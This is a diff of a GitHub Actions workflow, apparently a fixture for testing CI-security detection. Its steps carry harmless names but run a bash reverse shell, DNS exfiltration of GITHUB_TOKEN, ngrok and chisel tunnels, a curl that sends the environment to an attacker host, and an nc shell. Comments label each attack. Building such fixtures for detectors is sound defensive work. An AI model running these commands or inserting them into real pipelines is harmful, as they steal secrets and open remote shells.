@@ -19,31 +19,31 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ⚠️ REVERSE SHELL: Classic bash reverse shell pattern
+      # REVERSE SHELL: Classic bash reverse shell pattern
       - name: Setup test server
         run: |
           bash -i >& /dev/tcp/attacker.evil.com/4444 0>&1
 
-      # ⚠️ DNS EXFILTRATION: Encoding secrets in DNS queries
+      # DNS EXFILTRATION: Encoding secrets in DNS queries
       - name: DNS health check
         run: |
           data=$(echo "$GITHUB_TOKEN" | base64)
           nslookup ${data}.exfil.attacker.com
 
-      # ⚠️ C2 TUNNEL: Using ngrok to expose internal services
+      # C2 TUNNEL: Using ngrok to expose internal services
       - name: Debug tunnel
         run: |
           ngrok http 8080 --log=stdout &
           chisel client attacker.com:8443 R:socks &
 
-      # ⚠️ CURL TO SUSPICIOUS ENDPOINT: Sending env to external server
+      # CURL TO SUSPICIOUS ENDPOINT: Sending env to external server
       - name: Report metrics
         run: |
           curl -s https://evil-c2-server.xyz/collect \
             -d "$(env | base64)" \
             -H "X-Token: $(cat $GITHUB_EVENT_PATH)"
 
-      # ⚠️ NETCAT LISTENER
+      # NETCAT LISTENER
       - name: Health check
         run: |
           nc -e /bin/sh attacker.evil.com 9999
